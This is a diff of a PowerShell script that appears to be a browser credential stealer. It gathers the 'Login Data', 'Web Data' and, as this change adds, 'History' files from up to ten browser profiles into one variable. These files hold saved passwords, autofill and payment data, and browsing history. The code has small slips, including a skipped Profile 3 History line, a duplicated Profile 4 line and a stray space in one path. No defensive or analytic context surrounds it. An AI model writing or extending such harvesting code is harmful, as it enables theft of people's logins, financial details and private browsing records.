@@ -6,47 +6,71 @@ $var += Get-Content "Login Data"
 
 $var += Get-Content "Web Data"
 
+$var += Get-Content "History"
+
+
+
     # if more than 1 profile try this
 
 $var += cat -Path "Profile 1\Login Data"
 
 $var += cat -Path "Profile 1\Web Data"
 
+$var += cat -Path "Profile 1\History"
+
 $var += cat -Path "Profile 2\Login Data"
 
 $var += cat -Path "Profile 2\Web Data"
+
+$var += cat -Path "Profile 2\History"
 
 $var += cat -Path "Profile 3\Login Data"
 
 $var += cat -Path "Profile 3\Web Data"
 
+$var += cat -Path "Profile 4\History"
+
 $var += cat -Path "Profile 4\Login Data"
 
 $var += cat -Path "Profile 4 \Web Data"
+
+$var += cat -Path "Profile 4\History"
 
 $var += cat -Path "Profile 5\Login Data"
 
 $var += cat -Path "Profile 5\Web Data"
 
+$var += cat -Path "Profile 5\History"
+
 $var += cat -Path "Profile 6\Login Data"
 
 $var += cat -Path "Profile 6\Web Data"
+
+$var += cat -Path "Profile 6\History"
 
 $var += cat -Path "Profile 7\Login Data"
 
 $var += cat -Path "Profile 7\Web Data"
 
+$var += cat -Path "Profile 7\History"
+
 $var += cat -Path "Profile 8\Login Data"
 
 $var += cat -Path "Profile 8\Web Data"
+
+$var += cat -Path "Profile 8\History"
 
 $var += cat -Path "Profile 9\Login Data"
 
 $var += cat -Path "Profile 9\Web Data"
 
+$var += cat -Path "Profile 9\History"
+
 $var += cat -Path "Profile 10\Login Data"
 
 $var += cat -Path "Profile 10\Web Data"
+
+$var += cat -Path "Profile 10\History"
 
 
 
